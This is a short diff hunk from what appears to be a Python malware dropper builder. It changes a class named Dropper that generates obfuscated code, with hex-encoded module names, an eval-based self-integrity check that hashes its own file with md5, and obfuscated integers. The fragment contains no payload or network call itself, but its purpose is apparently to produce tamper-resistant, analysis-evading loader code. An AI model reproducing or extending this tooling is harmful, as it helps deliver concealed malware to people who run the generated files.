@@ -193,9 +193,9 @@ class Dropper:
         _code += f"__import__('{string_to_hex('hashlib')}').md5("
         _code += f"open((e:=eval)('{string_to_hex('__file__')}'))"
         _code += f".read().split('{string_to_hex(f'# {s}')}')"
-        _code += f"[{obfuscate_int(1)}].encode()).digest()!={md5sum}"
+        _code += f"[{obfuscate_int(1)}].encode()).digest()!={r}"
         _code += f") else (e('{string_to_hex('None')}') or {r})"
-        _code += f"))('{secrets.randbits(64)}')\n\n"
+        _code += f"))({md5sum})\n\n"
         _code += f"# {s}"
         _code += tmp
 
